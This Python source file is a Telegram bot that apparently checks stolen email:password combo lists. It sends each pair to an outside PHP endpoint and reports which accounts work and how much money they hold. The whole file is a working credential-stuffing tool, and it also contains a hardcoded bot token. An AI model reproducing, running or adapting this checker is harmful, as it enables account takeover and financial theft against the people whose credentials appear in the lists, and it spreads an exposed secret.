#—————–———Welcome————————#
# The BoT was made by 3-Developers
# Mostafa » python coder » tg: @E_2_7
# Ahmed » python coder » tg: @IGFIG
# Mostafa » php coder & api maker » tg: @P_Q_Z

# The Code is For Personal Use Only And is Not Permitted To Be Sold in Any Way
# Don't Forget to join ch: @Telemex
# Bye ;)
#——————–——Creadits———–—————#
import telebot, requests
#———————–—Libraries————––———#
session = requests.Session()
#——————–——session—————————#
bot = telebot.TeleBot('6759497305:AAF2S1Yz6xRVYd3Kd0m7tCE2VKMnHRhIJQQ')
#——–——–—–—BoT_Login———–————#
@bot.message_handler(commands=['start'])
def start(message):
	chat_id = message.chat.id
	bot.send_message(message.chat.id, "Welcome! Send me the file.")
#——————————————————————#
	@bot.message_handler(content_types=['document'])
	def handle_document(message):
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		file_content = downloaded_file.decode('utf-8')
		lines = file_content.strip().split('\n')
#——————————————————————#
		msg = bot.send_message(chat_id=chat_id,text="The Checking Started, Wait...⌛")
#——————————————————————#
		work = 0
		cents = 0
		fucked = 0
#——————————Lists—————————#
		for line in lines:
			line = line.strip()
			try:
				user, pas = line.split(':')
				email = f"{user}:{pas}"
				email1 = f"{user} • {pas}"	#——————————————————————#
				url = f"https://alflim.org/mos999/sms.php?email={user}&pass={pas}"
				
				response = session.post(url)
#—————————Request———————––#
				if '"status": true' in response.text:
					balance = response.json()['Balance']
					dollars = float(balance)	#——————————————————————#
					if len(balance) == 5:
						bot.send_message(chat_id, f'{email}>Working but this cent:{dollars}')
						cents += 1
					else:
						bot.send_message(chat_id, f'{email}>Have money dollars:{dollars}')
						work += 1	#——————————————————————#
				else:
					fucked += 1	#——————————————————————#
				reply_markup = create_reply_markup(email1,work,cents,fucked,len(lines))
				bot.edit_message_text(
	chat_id=chat_id,
	message_id=msg.message_id,
	text="Checking in progress...\nBot By @E_2_7 & @IGFIG & @P_Q_Z",
	reply_markup=reply_markup)
#——————————————————————#
			except ValueError:print("fuck")
#——————————————————————#
def create_reply_markup(line, work, cents, fucked, All):
    markup = telebot.telebot.types.InlineKeyboardMarkup()
    email_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {line} • ⌝", callback_data='none')
    work_button = telebot.types.InlineKeyboardButton(text=f"⌯ H-Balance: {work}", callback_data='none')
    cents_button = telebot.types.InlineKeyboardButton(text=f"Cents: {cents} ⌯", callback_data='none')
    dead_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Fucked: {fucked}", callback_data='none')
    all_button = telebot.types.InlineKeyboardButton(text=f"All: {All} • ⌟", callback_data='none')
    
    team_button = telebot.types.InlineKeyboardButton(text="Dev Team", url='https://t.me/telemex')
    dev_button = telebot.types.InlineKeyboardButton(text="Dev", url='https://t.me/E_2_7')
    
    markup.row(email_button)
    markup.row(work_button, cents_button)
    markup.row(dead_button, all_button)
    markup.add(team_button,dev_button)
    return markup
#—————————markup—————————#
bot.infinity_polling()